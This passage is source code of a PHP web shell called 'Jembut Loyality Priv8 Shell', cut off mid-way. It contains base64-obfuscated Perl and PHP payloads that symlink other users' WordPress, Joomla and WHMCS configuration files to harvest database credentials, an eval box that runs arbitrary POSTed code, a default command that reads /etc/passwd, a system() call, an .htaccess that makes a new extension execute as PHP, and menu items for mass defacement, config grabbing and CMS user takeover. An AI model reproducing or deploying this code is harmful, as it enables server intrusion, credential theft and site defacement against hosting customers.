Hk6IHRhaG9tYSwgdmVyZGFuYSwgQXJpYWw7DQogZm9udC1zaXplOiBtZWRpdW07DQogY29sb3I6ICNGRkZGRkY7DQogYmFja2dyb3VuZC1jb2xvcjogIzY2NjY2NjsNCiB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQoka29sYT0kbXNyLiIvIi4kdXNlcjsNCiRrb2xhPX5zL1xuLy9nOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWpvb21sYSAtIGhvbWUudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywka29sYS4nLXdvcmRwcmVzcyAtIHdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywka29sYS4nLSBDIE0gRiAudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGtvbGEuJy0gQyBNIEYgLSBmb3J1bS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGtvbGEuJy0gTXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywka29sYS4nLSBNeUJCIC0gZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nLSBPdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywka29sYS4nLSBCYWxpdGJhbmcudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWNsaWVudHMudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmdzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSB3aG1jcyAtIHdobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gd2htIC0gd2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLSBWQnVsbGV0aW4gLSBmb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGtvbGEuJwktIFBocEJCIC0gZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSB3aG1jIC0gd2htYy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJwktIHdobWNzMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nCS1tYW5nZXdobWNzLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nCS1teXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictb3Njb21tZXJjZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2FsZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGtvbGEuJy1hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd3dvcmRwcmVzcyAtIHdwIC0gYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBiZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLXdwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLXdvcmRwcmVzcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSBob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRrb2xhLictIHdvcmRwcmVzcyAtIHNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGtvbGEuJy0gd29yZHByZXNzIC0gbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywka29sYS4nLSB3b3JkcHJlc3MgLSB0ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictam9vbWxhIC0gam9vbWxhIC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSBqb29tbGEgLSBwcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gam9vLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictIGpvb21sYSAtIGNtcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy0gam9vbWxhIC0gbmV3cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLSBqb29tbGEgLSBuZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictIGpvb21sYSAtIGhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictIHZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy0gdmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1wYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWhvc3RzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictemVuY2FydC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLSB6ZW5jYXJ0IC0gc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywka29sYS4nLXNob3AtWkNzaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywka29sYS4nLSBzbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywka29sYS4nLSBzbWYgLSBzbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRrb2xhLictIHNtZiAtIGZvcnVtLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGtvbGEuJy0gc21mIC0gZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictIHVwbG9hZCAudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGtvbGEuJy0gbWFsYXkudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGtvbGEuJy0gbG9rb21lZGlhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGtvbGEuJy0gbG9rb21lZGlhLnR4dCcpOyANCiB9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPiZuYnNwOzwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9IndpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MDBweCI+PC90ZXh0YXJlYT4NCjxiciAvPjxiciAvPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAyMTJweCIgLz48YnIgLz48YnIgLz4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJIYWphciAuLiEiIHN0eWxlPSJ3aWR0aDogOTlweCIgLz4NCjxiciAvPg0KPC9mb3JtPic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIj4NCjxwPkRvbmUgISE8L3A+DQo8cD4mbmJzcDs8L3A+JzsNCmlmKCRGT1JNe3Rhcn0gbmUgIiIpew0Kb3BlbihJTkZPLCAidGFyLnRtcCIpOw0KQGxpbmVzID08SU5GTz4gOw0KY2xvc2UoSU5GTyk7DQpzeXN0ZW0oQGxpbmVzKTsNCnByaW50JzxwPjxhIGhyZWY9IicuJEZPUk17dGFyfS4nLnRhciI+IGRvd25sb2FkICBmaWxlPC9hPjwvcD4nOw0KfQ0KfQ0KIHByaW50Ig0KPC9ib2R5Pg0KPC9odG1sPiI7'; 
?>
<html>
<head>
<title>:) JembutLoyality Shell :)</title>
<script type="text/javascript">
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script>
<style type="text/css">
body{
	background:#000000;;
}
a {
text-decoration:none;
}
a:hover{
border-bottom:0px solid aqua;
}
*{
	font-size:11px;
	font-family:Lucida Grande,Lucida Sans Unicode,Lucida Sans;
	color:#FF1493;
}
#menu{
	background:#000000;
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:2px 7px;
	margin:0;
	background:#BFC7C6;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
#menu a:hover{
	background:black;
	border-bottom:1px solid #FFFF00;
	border-top:1px solid #FFFF00;
}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #FFFF00;
}
.main {
	width:100%;
}
.gaya {
	color: white;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:white;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover
	border-bottom:1px solid white;
	border-top:1px solid white;
	
}
.inputzbut:hover{
	border-bottom:1px solid white;
	border-top:1px solid white;
}
.output {
	margin:auto;
	border:1px solid aqua;
	width:100%;
	height:400px;
	background:#000000;
	padding:0 2px;
}
.cmdbox{
	width:100%;
}
.head_info{
	padding: 0 4px;
}
.jaya{ font-family: ;}

.kerupuk{
	font-size:50px;
	padding:0;
	color:red;
}
.kerupuk_1{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid #333333;
}
.phpinfo table{
	width:100%;
	padding:0 0 0 0;
}
.phpinfo td{
	background:#111111;
	color:#cccccc;
padding:6px 8px;;
}
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #333333;
font-weight:normal;
}
.phpinfo h2, .phpinfo h2 a{
	text-align:center;
	font-size:16px;
	padding:0;
	margin:30px 0 0 0;
	background:aqua;
	padding:4px 0;
}
.explore{
width:100%;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 8px;
line-height:24px;
}
.explore th{
padding:3px 8px;
font-weight:normal;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid aqua;
}
.explore tr:hover{
background:gray;
}
.viewfile{
background:white;
color:#000000;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}
</style></head>
<body onLoad="document.getElementById('cmd').focus();">
<!-- head info start here -->
<div class="main">
<center>
<hr color=black width=100%>
<img src="http://orig05.deviantart.net/a3e6/f/2012/152/4/7/killua_kawaii_chuu__by_renalyrica-d51vz2t.png" width="412" height="215"/><a/><br />
<a href="javascript:void(0)" onclick="location.reload();"><h2><center>Jembut Loyality Priv8 Shell</center></h2></a>
</center>
<a href="javascript:void(0)" onclick="location.reload();"><h2><center>-= Recoded by Kapaljetz666 =-</center></h2></a>
<hr color=black width=100%>
</div>
<center>
<td><?php echo $buff; ?></td>
<hr color=black width=100%>



<!-- head info end here -->
<!-- menu start -->
<div id="menu">
<a href="?<?php echo "y=".$pwd; ?>">Home</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">Shell</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">Eval</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">Mysql</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=jumping">Jumping</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=grabc">Config Grabber</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sec">Symlink Server</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=sf">Symlink File</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dv">/var/named</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=dump">DB Dump</a>
<br><br>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">Upload</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=ggwp">Wordpress Auto Edit User</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=joom">Joomla Auto Edit User</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">PhpInfo</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mass">Mass Deface</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hash">Hash</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=hashid">Hash ID</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cpanel">Cpanel Tools</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">NetSploit</a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about">About</a>
<a href="?<?php echo "y=".$pwd;	?>&amp;x=logout">Logout</a>

</div>
<!-- menu end -->

<?php
@ini_set('display_errors', 0);
if(isset($_GET['x']) && ($_GET['x'] == 'php')){ ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
if(isset($_POST['submitcmd'])) {
	echo eval(magicboom($_POST['cmd']));
}
else echo "echo file_get_contents('/etc/passwd');";
?>
</textarea>
<tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>

<?php } 

elseif(isset($_GET['x']) && ($_GET['x'] == 'sql'))
    {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sql" method="post">
<?php
echo "<center/><br/><b><font color=white>Mysql Interface by S4MP4H</font></b><br><br>";
  mkdir('mysql', 0755);
    chdir('mysql');
        $akses = ".htaccess";
        $buka_lah = "$akses";
        $buka = fopen ($buka_lah , 'w') or die ("Error cuyy!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
";    
        fwrite ( $buka , $metin ) ;
        fclose ($buka);
$sqlshell = 'PD8NCiRQQVNTV09SRCA9ICJyb290X3hoYWhheCI7DQokVVNFUk5BTUUgPSAieGhhaGF4IjsNCmlmICggZnVuY3Rpb25fZXhpc3RzKCdpbmlfZ2V0JykgKSB7DQoJJG9ub2ZmID0gaW5pX2dldCgncmVnaXN0ZXJfZ2xvYmFscycpOw0KfSBlbHNlIHsNCgkkb25vZmYgPSBnZXRfY2ZnX3ZhcigncmVnaXN0ZXJfZ2xvYmFscycpOw0KfQ0KaWYgKCRvbm9mZiAhPSAxKSB7DQoJQGV4dHJhY3QoJEhUVFBfU0VSVkVSX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfQ09PS0lFX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfUE9TVF9GSUxFUywgRVhUUl9TS0lQKTsNCglAZXh0cmFjdCgkSFRUUF9QT1NUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfR0VUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfRU5WX1ZBUlMsIEVYVFJfU0tJUCk7DQp9DQoNCmZ1bmN0aW9uIGxvZ29uKCkgew0KCWdsb2JhbCAkUEhQX1NFTEY7DQoJc2V0Y29va2llKCAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKTsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICk7DQoJZWNobyAiPHRhYmxlIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCU+PHRyPjx0ZD48Y2VudGVyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9Mj48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjx0YWJsZSBjZWxscGFkZGluZz0yMD48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjxoMT5NeVNRTCBJbnRlcmZhY2UgQnkgUzRNUDRIPC9oMT5cbiI7DQoJZWNobyAiPGZvcm0gYWN0aW9uPSckUEhQX1NFTEYnPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9Ykc5bmIyNWZjM1ZpYldsMD5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxwYWRkaW5nPTUgY2VsbHNwYWNpbmc9MT5cbiI7DQoJZWNobyAiPHRyPjx0ZCBjbGFzcz1cIm5ld1wiPkhvc3RuYW1lIDwvdGQ+PHRkPiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9aG9zdG5hbWUgdmFsdWU9J2xvY2FsaG9zdCc+PC90ZD48L3RyPlxuIjsNCgllY2hvICI8dHI+PHRkIGNsYXNzPVwibmV3XCI+VXNlcm5hbWUgPC90ZD48dGQ+IDxpbnB1dCB0eXBlPXRleHQgbmFtZT11c2VybmFtZT48L3RkPjwvdHI+XG4iOw0KCWVjaG8gIjx0cj48dGQgY2xhc3M9XCJuZXdcIj5QYXNzd29yZCA8L3RkPjx0ZD4gPGlucHV0IHR5cGU9cGFzc3dvcmQgbmFtZT1wYXNzd29yZD48L3RkPjwvdHI+XG4iOw0KCWVjaG8gIjwvdGFibGU+PHA+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nRW50ZXInPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1yZXNldCB2YWx1ZT0nQ2xlYXInPjxicj5cbiI7DQoJZWNobyAiPC9mb3JtPlxuIjsNCgllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC